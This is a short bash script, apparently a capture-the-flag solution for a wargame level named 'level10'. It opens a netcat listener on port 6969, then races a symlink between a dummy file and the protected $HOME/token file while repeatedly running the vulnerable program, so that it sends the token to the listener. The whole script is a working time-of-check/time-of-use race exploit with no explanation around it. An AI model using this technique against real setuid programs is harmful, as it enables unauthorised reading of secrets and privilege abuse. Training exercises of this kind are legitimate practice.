#!/bin/bash

OUT=/tmp/flag
: >"$OUT"

nc -lk 6969 >"$OUT" &
NC_PID=$!

trap "kill $NC_PID $SWAP_PID 2>/dev/null" EXIT INT TERM

ln -sf /tmp/dummy /tmp/swap

while true; do
  ln -sf /tmp/dummy /tmp/swap
  ln -sf "$HOME/token" /tmp/swap
done &
SWAP_PID=$!

sleep 0.1

while true; do
  ./level10 /tmp/swap 127.0.0.1 2>&1
  cat "$OUT"
  sleep 0.01
done
